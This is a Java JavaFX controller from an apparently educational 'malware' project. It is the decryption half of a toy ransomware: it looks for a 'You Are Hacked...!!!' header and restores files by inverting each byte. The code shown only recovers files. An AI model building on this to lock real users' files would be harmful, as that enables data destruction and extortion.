package lk.ijse.dep10.malware.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;

import java.io.*;
import java.util.ArrayList;

public class MainSceneController {

    @FXML
    private Button btnDecrypt;
    ArrayList<File> fileArrayList;
    private final String SIGNATURE = "You Are Hacked...!!!";

    public void initData(ArrayList<File> fileArrayList) {
        this.fileArrayList = fileArrayList;
    }

    public void btnDecryptOnAction(ActionEvent actionEvent) throws IOException {
        for (File file : fileArrayList) {
            /*Checking for already decrypted files*/
            FileInputStream fis1 = new FileInputStream(file);
            byte[] bytes = SIGNATURE.getBytes();
            int read = fis1.read(bytes);
            if (read != -1) {
                if (!(new String(bytes).equals(SIGNATURE))) {
                    System.out.println("aaaa");
                    continue;
                }
            }
            fis1.close();

            File tempFile = File.createTempFile("ijse", "dep10");

            FileInputStream fis = new FileInputStream(file);
            FileOutputStream fos = new FileOutputStream(tempFile);

            fis.read(SIGNATURE.getBytes());
            decrypt(fis,fos);

            fis.close();
            fos.close();

            file.delete();
            tempFile.renameTo(file);

        }
    }

    public void decrypt(FileInputStream fis, FileOutputStream fos) throws IOException {
        while (true) {
            int read = fis.read();
            if (read == -1) {
                break;
            }
            fos.write(~read);
        }
    }
}
